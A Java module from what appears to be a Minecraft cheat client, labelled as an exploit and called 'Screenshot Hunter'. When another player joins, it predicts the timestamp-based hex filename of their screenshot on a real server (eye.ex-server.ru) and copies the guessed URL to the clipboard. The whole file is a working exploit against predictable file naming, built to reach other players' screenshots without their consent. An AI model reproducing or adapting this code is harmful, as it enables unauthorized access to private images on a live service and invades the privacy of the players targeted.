 
package ru.fuctorial.fuctorize.module.impl;

import net.minecraft.network.play.server.S38PacketPlayerListItem;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.event.ClickEvent;
import net.minecraft.util.ChatComponentText;
import ru.fuctorial.fuctorize.FuctorizeClient;
import ru.fuctorial.fuctorize.event.PacketEvent;
import ru.fuctorial.fuctorize.module.Category;
import ru.fuctorial.fuctorize.module.Module;
import ru.fuctorial.fuctorize.module.settings.BindSetting;
import ru.fuctorial.fuctorize.utils.ChatUtils;
import org.lwjgl.input.Keyboard;

import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

public class ScreenshotHunter extends Module {

    private final long DELAY_MS = 210_000L;  
    private long timeOffset = 0;
    private boolean isTimeSynced = false;

    public ScreenshotHunter(FuctorizeClient client) {
        super(client);
    }

    @Override
    public void init() {
        setMetadata("screenshothunter", "Screenshot Hunter", Category.EXPLOIT);
        addSetting(new BindSetting("Bind", Keyboard.KEY_NONE));
        setShowInHud(true);
        syncTime();
    }

    @Override
    public String getDescription() {
        return "Instant UniqID Predictor. Shows future links immediately.";
    }

    private void syncTime() {
        new Thread(() -> {
            try {
                URL url = new URL("https://google.com");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("HEAD");
                connection.setConnectTimeout(3000);
                connection.connect();

                long serverDate = connection.getDate();
                if (serverDate != 0) {
                    long localTime = System.currentTimeMillis();
                    timeOffset = serverDate - localTime;
                    isTimeSynced = true;
                    ChatUtils.printMessage("§7[Hunter] §aTime synced! Offset: " + timeOffset + "ms");
                }
            } catch (Exception e) {
                ChatUtils.printMessage("§7[Hunter] §cTime sync failed. Using local time.");
            }
        }).start();
    }

    @Override
    public void onPacketReceive(PacketEvent.Receive event) {
        if (!(event.getPacket() instanceof S38PacketPlayerListItem)) return;
        S38PacketPlayerListItem packet = (S38PacketPlayerListItem) event.getPacket();

        if (packet.func_149121_d()) {  
            String name = packet.func_149122_c();
            int ping = packet.func_149120_e();

            if (name != null && !name.equals(mc.thePlayer.getCommandSenderName())) {

                 
                long now = System.currentTimeMillis();
                long exactServerTime = isTimeSynced ? (now + timeOffset) : now;
                int estimatedPing = ping == 0 ? 50 : ping;
                long joinTime = exactServerTime - (estimatedPing / 2);

                 
                long targetTime = joinTime + DELAY_MS;

                 
                printCalculations(name, targetTime);
            }
        }
    }

    private void printCalculations(String name, long targetTime) {
         
        SimpleDateFormat sdfFolder = new SimpleDateFormat("dd-MM-yyyy");
        sdfFolder.setTimeZone(TimeZone.getTimeZone("Europe/Moscow"));

        SimpleDateFormat sdfTime = new SimpleDateFormat("HH:mm:ss");
        sdfTime.setTimeZone(TimeZone.getTimeZone("Europe/Moscow"));

        String dateFolder = sdfFolder.format(new Date(targetTime));
        String expectedTime = sdfTime.format(new Date(targetTime));
        String baseUrl = "https://eye.ex-server.ru//" + dateFolder + "/";

         

         
        long seconds = targetTime / 1000L;
        String hexSec = Long.toHexString(seconds);

         
         
        long micro = (targetTime % 1000L) * 1000L;
        String hexMicro = String.format("%05x", micro);

         
        String exactLink = baseUrl + hexSec + hexMicro + ".png";

         
        String rangeStartID = generateUniqId(targetTime - 500);
        String rangeEndID = generateUniqId(targetTime + 500);

         
        ChatUtils.printMessage("§6=============================================");
        ChatUtils.printMessage("§e[Hunter] Target: §f" + name);
        ChatUtils.printMessage("§7Expected Time: §b" + expectedTime + " MSK");
        ChatUtils.printMessage("§7Folder: §3" + dateFolder);

        ChatUtils.printMessage("§71. Range (+/- 0.5s):");
        printCopyable("   Start: " + rangeStartID, rangeStartID);
        printCopyable("   End:   " + rangeEndID, rangeEndID);

        ChatUtils.printMessage("§72. Second Hex:");
        printCopyable("   Sec:   " + hexSec, hexSec);

        ChatUtils.printMessage("§73. Exact Link (Prediction):");
        ChatUtils.printMessage("   §n" + exactLink);

         
        net.minecraft.client.gui.GuiScreen.setClipboardString(exactLink);
        ChatUtils.printMessage("§a(Copied to clipboard)");
        ChatUtils.printMessage("§6=============================================");
    }

    private String generateUniqId(long millis) {
        long sec = millis / 1000L;
        long micro = (millis % 1000L) * 1000L;
        return String.format("%08x%05x", sec, micro);
    }

    private void printCopyable(String text, String toCopy) {
        ChatComponentText msg = new ChatComponentText(text);
        msg.getChatStyle().setChatClickEvent(new ClickEvent(ClickEvent.Action.SUGGEST_COMMAND, toCopy));
        msg.getChatStyle().setColor(EnumChatFormatting.GRAY);
        mc.thePlayer.addChatMessage(msg);
    }
}